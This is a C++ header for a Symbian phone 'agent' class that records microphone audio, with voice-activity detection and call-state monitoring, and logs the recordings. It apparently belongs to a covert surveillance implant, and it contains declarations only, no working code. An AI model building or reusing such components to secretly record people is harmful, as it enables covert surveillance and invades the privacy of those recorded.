/*
 * AgentMic.h
 *
 *  Created on: 29/ago/2010
 *      Author: Giovanna
 */

/*
 * This code is based on:
 * S60 Platform: Audio Streaming Example v2.1 
 * http://www.forum.nokia.com/info/sw.nokia.com/id/4ed27119-e08e-480e-b0b8-aeb48fe5c5e8/S60_Platform_Audio_Streaming_Example_v2_1_en.zip.html
 */


#ifndef AGENTMIC_H_
#define AGENTMIC_H_

// INCLUDES
#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"
#include "SlimMonitorPhoneCall.h"
#include <MdaAudioInputStream.h>
#include <mda\common\audio.h>
#include <mmf\common\mmfutilities.h>
#include <HT\Logging.h>
#include <HT\TimeOutTimer.h>


// CLASS DECLARATION

/**
 *  CAgentMic
 * 
 */
class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentMic();

	/**
	 * Two-phased constructor.
	 */
	static CAgentMic* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentMic* NewLC(const TDesC8& params);
	
	
protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentMic();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	// From MSlimCallMonCallBack
	virtual void NotifyIdle();
	virtual void NotifyDialling();
	virtual void NotifyRinging();

	// From MTimeOutNotifier
	virtual void TimerExpiredL(TAny* src);
	    
	/*
	 * MaiscOpenComplete()
	 *
	 * A callback function that is called when 
	 * CMdaAudioInputStream::Open() has completed, indicating that the audio 
	 * input stream is ready for use.
	 */
	virtual void MaiscOpenComplete(TInt aError);

	/*
	 * MaiscBufferCopied()
	 *
	 * A callback function that is called when a chunk of audio data 
	 * has been copied to the descriptor specified in a 
	 * CMdaAudioInputStream::ReadL().
	 */
	virtual void MaiscBufferCopied(TInt aError, const TDesC8& aBuffer);
	
	/*
	 * MaiscRecordComplete()
	 *
	 * A callback function that is called when the input stream is
	 * closed using CMdaAudioInputStream::Stop(). 
	 *
	 */ 
	virtual void MaiscRecordComplete(TInt aError);
		

	void RestartRecording();
	
private: // data members
	TBool iVadActive;
	TUint32 iVadThreshold;
	
	// audio input stream object reference
	CMdaAudioInputStream* iInputStream;
	// The default encoding used 
	TFourCC iDefaultEncoding;
	// Audio data stream settings for input stream
	TMdaAudioDataSettings iStreamSettings;
	// Buffers used during recording
	RPointerArray<TDes8>	iStreamBufferArray;
	// Data to be written into log file
	HBufC8* iRecData;
	// Frames counter
	TInt iFramesCounter;
	
	TMicAdditionalData iMicAdditionalData;  
	
	CSlimPhoneCallMonitor*	iCallMonitor;
	CTimeOutTimer* 	iTimer;
	
	__FLOG_DECLARATION_MEMBER
	};


#endif /* AGENTMIC_H_ */
